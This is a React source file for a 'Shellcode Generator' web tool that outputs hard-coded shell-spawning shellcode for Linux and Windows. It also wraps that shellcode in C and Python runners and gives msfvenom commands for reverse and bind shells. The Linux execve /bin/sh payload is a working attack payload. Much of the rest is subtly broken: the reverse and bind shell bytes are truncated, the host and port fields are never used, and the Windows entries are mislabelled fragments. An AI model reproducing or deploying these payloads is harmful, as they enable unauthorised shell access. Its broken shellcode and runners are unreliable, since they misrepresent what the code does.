import { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import { ZapIcon } from '../common/Icons';
import styles from './SharedTool.module.css';

type Platform = 'linux-x64' | 'linux-x86' | 'windows-x64' | 'windows-x86';
type ShellcodeType = 'execve' | 'reverse-shell' | 'bind-shell';

export default function ShellcodeGenerator() {
  const [platform, setPlatform] = useState<Platform>('linux-x64');
  const [shellcodeType, setShellcodeType] = useState<ShellcodeType>('execve');
  const [ip, setIp] = useState('127.0.0.1');
  const [port, setPort] = useState('4444');
  const [format, setFormat] = useState<'hex' | 'c' | 'python'>('hex');
  const [output, setOutput] = useState('');
  const [error, setError] = useState('');

  const shellcodeTemplates: Record<Platform, Record<ShellcodeType, string>> = {
    'linux-x64': {
      execve:
        '\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05',
      'reverse-shell':
        '\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0',
      'bind-shell':
        '\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05',
    },
    'linux-x86': {
      execve:
        '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
      'reverse-shell':
        '\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59',
      'bind-shell':
        '\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e',
    },
    'windows-x64': {
      execve:
        '\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff',
      'reverse-shell':
        '// Use msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f hex',
      'bind-shell': '// Use msfvenom: msfvenom -p windows/x64/shell_bind_tcp LPORT=PORT -f hex',
    },
    'windows-x86': {
      execve: '\\x31\\xc9\\x64\\x8b\\x41\\x30\\x8b\\x40\\x0c\\x8b\\x70\\x14',
      'reverse-shell':
        '// Use msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hex',
      'bind-shell': '// Use msfvenom: msfvenom -p windows/shell_bind_tcp LPORT=PORT -f hex',
    },
  };

  const generate = () => {
    setError('');
    const raw = shellcodeTemplates[platform][shellcodeType];

    if (raw.startsWith('//')) {
      setOutput(raw);
      return;
    }

    switch (format) {
      case 'hex':
        setOutput(raw);
        break;
      case 'c':
        setOutput(
          `unsigned char shellcode[] = "${raw}";\n\nint main() {\n    void (*func)() = (void(*)())shellcode;\n    func();\n    return 0;\n}`
        );
        break;
      case 'python':
        setOutput(
          `import ctypes\n\nshellcode = b"${raw}"\n\nlibc = ctypes.CDLL('libc.so.6')\nshellcode_mem = ctypes.create_string_buffer(shellcode)\nfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(shellcode_mem))\nfunc()`
        );
        break;
    }
  };

  return (
    <ToolWrapper
      title="Shellcode Generator"
      icon={<ZapIcon />}
      description="Generate position-independent shellcode for exploit development"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Platform</label>
          <select
            className={styles.select}
            value={platform}
            onChange={(e) => setPlatform(e.target.value as Platform)}
          >
            <option value="linux-x64">Linux x64</option>
            <option value="linux-x86">Linux x86</option>
            <option value="windows-x64">Windows x64</option>
            <option value="windows-x86">Windows x86</option>
          </select>
        </div>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Shellcode Type</label>
          <select
            className={styles.select}
            value={shellcodeType}
            onChange={(e) => setShellcodeType(e.target.value as ShellcodeType)}
          >
            <option value="execve">Execute Command (execve)</option>
            <option value="reverse-shell">Reverse Shell</option>
            <option value="bind-shell">Bind Shell</option>
          </select>
        </div>
        {shellcodeType === 'reverse-shell' && (
          <div className={styles.flexRow}>
            <div className={styles.inputGroup} style={{ flex: 2 }}>
              <label className={styles.label}>LHOST</label>
              <input
                type="text"
                className={styles.input}
                value={ip}
                onChange={(e) => setIp(e.target.value)}
                placeholder="127.0.0.1"
              />
            </div>
            <div className={styles.inputGroup} style={{ flex: 1 }}>
              <label className={styles.label}>LPORT</label>
              <input
                type="text"
                className={styles.input}
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="4444"
              />
            </div>
          </div>
        )}
        {shellcodeType === 'bind-shell' && (
          <div className={styles.inputGroup}>
            <label className={styles.label}>Bind Port</label>
            <input
              type="text"
              className={styles.input}
              value={port}
              onChange={(e) => setPort(e.target.value)}
              placeholder="4444"
            />
          </div>
        )}
        <div className={styles.inputGroup}>
          <label className={styles.label}>Output Format</label>
          <select
            className={styles.select}
            value={format}
            onChange={(e) => setFormat(e.target.value as 'hex' | 'c' | 'python')}
          >
            <option value="hex">Raw Hex</option>
            <option value="c">C Code</option>
            <option value="python">Python</option>
          </select>
        </div>
        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={generate}>
            Generate Shellcode
          </button>
          <button
            className={styles.secondaryBtn}
            onClick={() => {
              setOutput('');
              setError('');
            }}
          >
            Clear
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {output && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Generated Shellcode</span>
            <button
              className={styles.copyBtn}
              onClick={() => navigator.clipboard.writeText(output)}
            >
              Copy
            </button>
          </div>
          <pre className={styles.codeBlock}>{output}</pre>
        </div>
      )}

      <div className={styles.warningBox}>
        This tool generates shellcode templates for educational purposes. Always test in authorized
        environments only.
      </div>
    </ToolWrapper>
  );
}
